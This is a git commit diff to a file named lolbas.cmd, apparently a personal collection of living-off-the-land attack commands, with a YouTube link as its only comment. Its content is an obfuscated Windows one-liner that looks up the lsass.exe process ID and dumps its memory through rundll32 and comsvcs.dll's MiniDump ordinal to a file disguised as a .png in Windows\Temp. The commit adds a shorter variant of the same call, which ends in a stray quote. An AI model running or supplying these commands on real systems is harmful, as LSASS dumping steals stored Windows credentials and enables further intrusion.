25783bf6273846e02f5fb16e083e9be9c587a294
RockAfeller2013 <428819+RockAfeller2013@users.noreply.github.com>
2025-06-23 08:43:10 +1000

    Update lolbas.cmd

--- lolbas.cmd
+++ lolbas.cmd
@@ -1,2 +1,3 @@
 # https://www.youtube.com/watch?v=52tAmVLg1KM
 %COMSPEC% /Q /c cmd.eXE /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\jvX7H.png ful
+rundll32.exe comsvcs.dll,#24’
